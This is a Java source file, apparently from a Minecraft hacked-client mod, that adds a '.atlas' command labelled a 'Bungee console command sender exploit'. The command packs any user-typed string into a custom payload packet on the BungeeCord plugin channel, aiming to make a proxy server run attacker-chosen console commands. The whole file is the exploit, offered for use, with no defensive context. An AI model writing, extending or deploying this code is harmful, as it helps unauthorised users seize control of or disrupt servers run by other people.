package io.github.spigotrce.paradiseclientfabric.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import com.mojang.brigadier.builder.RequiredArgumentBuilder;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.util.Identifier;
import net.minecraft.network.PacketByteBuf;
import io.netty.buffer.Unpooled;

public class BungeeConsole extends Command {
    public BungeeConsole(MinecraftClient minecraftClient) {
        super("atlas", "Bungee console command sender exploit", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<ServerCommandSource> build() {
        return LiteralArgumentBuilder.<ServerCommandSource>literal(this.getName())
                .executes(context -> {
                    Helper.printChatMessage("Usage: .atlas <command>");
                    return 1;
                })
                .then(RequiredArgumentBuilder
                        .<ServerCommandSource, String>argument("command", StringArgumentType.greedyString())
                        .executes(this::sendCommand)
                );
    }

    private int sendCommand(CommandContext<?> context) {
        String command = StringArgumentType.getString(context, "command");

        PacketByteBuf buf = new PacketByteBuf(Unpooled.buffer());
        buf.writeString(command); // Customize format based on Bungee plugin

        Identifier channel = new Identifier("bungeecord", "main"); // Common BungeeCord plugin message channel
        CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(channel, buf);

        Helper.sendPacket(packet);
        Helper.printChatMessage("Payload sent to BungeeCord!");
        return 1;
    }
}
